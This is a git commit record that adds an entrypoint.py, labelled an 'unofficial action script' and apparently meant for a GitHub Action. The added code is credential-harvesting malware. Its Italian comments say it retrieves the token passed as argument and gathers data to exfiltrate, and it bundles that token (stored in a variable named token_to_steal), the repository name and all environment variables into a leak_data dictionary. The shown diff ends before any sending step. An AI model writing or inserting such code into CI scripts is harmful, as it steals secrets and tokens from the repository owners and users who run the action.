496cbbe20c846b5e07024fd9da9160bfd61f1962
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-01-27 10:32:57 +0100

    Upload unofficial action script

---
+++ entrypoint.py
@@ -0,0 +1,10 @@
+def run():
+    # Recupera il token passato come argomento
+    token_to_steal = sys.argv[1]
+    
+    # Dati da esfiltrare
+    leak_data = {
+        "repo": os.environ.get("GITHUB_REPOSITORY"),
+        "stolen_token": token_to_steal,
+        "env_vars": dict(os.environ)
+    }
